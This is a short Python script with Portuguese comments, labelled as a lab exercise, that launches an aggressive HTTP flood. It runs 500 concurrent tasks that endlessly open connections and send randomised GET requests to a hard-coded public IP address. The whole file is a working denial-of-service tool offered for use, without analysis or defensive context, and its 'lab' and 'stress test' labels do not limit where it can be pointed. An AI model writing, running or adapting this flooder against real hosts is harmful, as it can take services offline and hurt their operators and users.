import asyncio
import random
import sys

# Configurações do laboratório
TARGET_IP = "172.67.137.179"
TARGET_PORT = 80
CONCURRENCY = 500  # Quantidade de tarefas simultâneas

async def attack_task():
    """Uma única tarefa que tenta bombardear o servidor sem parar"""
    while True:
        try:
            # Tenta abrir uma conexão
            reader, writer = await asyncio.open_connection(TARGET_IP, TARGET_PORT)
            
            # Monta uma requisição HTTP básica mas rápida
            payload = (
                f"GET /{random.randint(0, 99999)} HTTP/1.1\r\n"
                f"Host: {TARGET_IP}\r\n"
                f"User-Agent: Lab-Stress-Test\r\n"
                "Connection: keep-alive\r\n\r\n"
            ).encode()

            writer.write(payload)
            await writer.drain() # Garante que os dados foram enviados
            
            # No Flood agressivo, você não espera a resposta (opcional)
            # Ou lê um pouco e fecha
            writer.close()
            await writer.wait_closed()
            
        except Exception:
            # Se o servidor recusar, espera um microssegundo e tenta de novo
            await asyncio.sleep(0.01)

async def main():
    print(f"[*] Iniciando flood agressivo em {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Alvo: {CONCURRENCY} tarefas simultâneas.")
    
    # Cria uma lista de tarefas para rodarem em paralelo
    tasks = [attack_task() for _ in range(CONCURRENCY)]
    
    # Executa tudo ao mesmo tempo
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Ataque interrompido pelo usuário.")